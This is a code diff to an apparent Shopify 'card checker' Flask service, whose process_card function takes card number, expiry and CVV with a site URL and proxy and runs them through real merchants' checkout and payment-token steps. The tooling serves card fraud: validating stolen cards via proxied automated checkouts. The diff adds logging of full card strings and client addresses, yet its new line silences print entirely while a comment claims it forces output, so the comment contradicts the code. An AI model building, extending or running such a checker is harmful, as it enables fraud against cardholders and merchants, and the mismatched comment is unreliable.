@@ -9,6 +9,10 @@ from flask import Flask, request, jsonify
 import os
 import time
 import logging
+import functools
+
+# Force prints to flush immediately (so logs appear in real-time on Railway)
+print = lambda *args, **kwargs: None
 
 logging.getLogger("werkzeug").disabled = True
 
@@ -260,6 +264,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
     checkpoint_data = None
     running_total = "0.00"
 
+    print(f"[CARD] Processing {cc} on {ourl} | proxy={proxy_str}")
+
     try:
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
@@ -319,6 +325,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if cart_resp.status != 200:
                 return False, f"Cart failed with status {cart_resp.status}", gateway, total_price, currency
 
+            print(f"[CART] Added variant {variant_id} -> status {cart_resp.status}")
+
             checkout_headers = {
                 **headers,
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
@@ -329,6 +337,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             }
             response = await session.post(url=checkout, allow_redirects=True, headers=checkout_headers, proxy=proxy)
             checkout_url = str(response.url)
+            print(f"[CHECKOUT] Got checkout URL -> {checkout_url}")
 
             attempt_token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
             attempt_token = attempt_token_match.group(1) if attempt_token_match else checkout_url.split('/')[-1].split('?')[0]
@@ -389,7 +398,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             if not sst:
                 return False, "Failed to get session token", gateway, total_price, currency
-            
+
+            print(f"[TOKEN] Session token obtained | currency={currency} subtotal={subtotal}")
+
             headers.update({
                 'shopify-checkout-client': 'checkout-web/1.0',
                 'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
@@ -626,7 +637,10 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             
             if not payment_identifier:
                 return False, "No valid payment method found", gateway, total_price, currency
-            
+
+            print(f"[PROPOSAL] delivery_strategy={delivery_strategy} shipping={shipping_amount} "
+                  f"tax={tax_amount} running_total={running_total} gateway={gateway}")
+
             json_data['query'] = QUERY_PROPOSAL_DELIVERY
             json_data['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy'] = {
                 'deliveryStrategyByHandle': {
@@ -700,6 +714,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     return False, 'Unable to get payment token', gateway, total_price, currency
             except Exception as e:
                 return False, f'Unable to get payment token: {str(e)}', gateway, total_price, currency
+
+            print(f"[VAULT] Payment token obtained")
 
             params = {'operationName': 'SubmitForCompletion'}
             
@@ -990,6 +1006,7 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 return False, f"Unknown Result", gateway, total_price, currency
 
     except Exception as e:
+        print(f"[CARD] ERROR -> {e}")
         return False, f"Error Processing Card: {str(e)}", gateway, total_price, currency
 
 def parse_cc_string(cc_string):
@@ -1016,7 +1033,12 @@ def shopify_checker():
         site = request.args.get('url') or request.args.get('site') or request.args.get('link')
         cc_string = request.args.get('cc') or request.args.get('card')
         proxy_str = request.args.get('proxy')
-        
+
+        # Log incoming request like the Flask access log
+        print(f"[{time.strftime('%d/%b/%Y %H:%M:%S')}] GET {request.path} "
+              f"site={site} cc={cc_string} proxy={proxy_str} "
+              f"client={request.remote_addr}")
+
         if not site:
             return jsonify({
                 "error": "Missing 'site' parameter",
